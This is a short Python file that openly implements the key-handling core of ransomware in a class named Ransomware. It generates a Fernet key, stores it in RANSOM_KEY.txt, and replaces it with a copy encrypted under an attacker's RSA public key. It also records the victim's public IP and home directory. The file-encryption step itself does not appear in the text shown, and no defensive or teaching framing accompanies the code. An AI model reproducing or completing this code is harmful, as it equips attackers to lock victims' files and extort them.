import os
import requests
from cryptography.fernet import Fernet
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP


class Ransomware:
    def __init__(self):
        self.ransomKey = None
        self.encryptor = None
        self.publicKey = None
        self.homeDir = os.path.expanduser('~')
        self.targerDir = "REDACTED"
        self.publicIP = requests.get('https://api.ipify.org').text

    def gen_ransom_key(self):
        self.ransomKey = Fernet.generate_key()
        self.encryptor = Fernet(self.ransomKey)

    def write_ransom_key(self):
        with open('RANSOM_KEY.txt', 'wb') as f:
            f.write(self.ransomKey)

    def encrypt_ransom_key(self):
        with open('RANSOM_KEY.txt', 'rb') as f:
            ransomKey = f.read()
        with open('RANSOM_KEY.txt', 'wb') as f:
            self.publicKey = RSA.import_key(open('public.pem').read())
            publicEncryptor = PKCS1_OAEP.new(self.publicKey)
            encryptedRansomKey = publicEncryptor.encrypt(ransomKey)
            f.write(encryptedRansomKey)


def main():
    pyransom = Ransomware()
    pyransom.gen_ransom_key()
    pyransom.write_ransom_key()
    pyransom.encrypt_ransom_key()


if __name__ == "__main__":
    main()
